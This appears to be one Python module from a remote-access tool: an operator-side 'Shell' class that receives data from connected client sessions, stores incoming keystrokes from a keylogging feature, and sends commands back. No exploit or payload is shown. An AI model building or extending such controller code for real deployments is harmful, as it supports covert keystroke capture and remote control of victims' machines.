# Date: 06/05/2018
# Author: Pure-L0G1C
# Description: Recv/Send to master

import sys
import time
from queue import Queue
from threading import Thread, RLock

class Shell(object):

    def __init__(self, sess_obj, interface):
        self.interface = interface
        self.keylogging = False
        self.keystrokes = None
        self.sess = sess_obj
        self.is_alive = True
        self.recv = Queue()
        self.lock = RLock()

    def start(self):
        t1 = Thread(target=self.listen)
        t2 = Thread(target=self.recv_manager)

        t1.daemon = True
        t2.daemon = True

        t1.start()
        t2.start()

        t1.join()
        t2.join()

    def listen(self):
        while self.is_alive:
            recv = self.sess.recv()
            if recv:
                self.recv.put(recv)
            else:
                self.is_alive = False
                self.interface.disconnect_client(self.sess)

    def recv_manager(self):
        while self.is_alive:
            if self.recv.qsize():
                with self.lock:
                    recv = self.recv.get()
                    if recv['code'] == -0:
                        self.keystrokes = recv['args']
                    self.display_text('Data: {}'.format(recv['args']))

    def send(self, code=None, args=None):
        self.sess.send(code=code, args=args)

    def display_text(self, text):
        print('{0}{1}{0}'.format('\n\n\t', text))
